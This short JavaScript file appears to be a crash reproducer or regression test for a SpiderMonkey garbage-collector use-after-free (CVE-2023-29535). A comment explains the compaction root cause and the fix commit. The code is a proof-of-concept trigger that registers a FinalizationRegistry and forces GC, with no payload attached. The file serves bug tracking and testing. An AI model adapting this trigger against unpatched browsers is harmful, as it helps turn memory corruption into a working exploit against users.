// CVE-2023-29535 / Bugzilla 1820543 — Memory corruption after GC
//
// Root cause: GCRuntime::updatePointersToRelocatedCells (compaction)
// updated FinalizationRegistry observer edges BEFORE the weak maps
// they reference. When compaction relocated a WeakMap entry, the
// observer path still held the old pointer — post-move dereference
// is a heap UAF on a js::gc::Cell.
//
// Fix: commit 533d5be1269d680dbef53e0116a917f1a7485e9d
//      ("Update weak maps before finalization observer edges when
//       compacting r=sfink", 2023-03-15)
// File: js/src/gc/Compacting.cpp

const v1 = ("DEB1").startsWith("DEB1");
function f2(a3, a4, a5, a6) {
    return ({"constructor":this,"b":a3,"__proto__":this}).newGlobal(f2);
}
f2.newCompartment = v1;
with (f2()) {
    function f11(a12, a13) {
        return "DEB1";
    }
    const v15 = new FinalizationRegistry(f11);
    v15.register(f2);
}
this.reportLargeAllocationFailure();
gc()
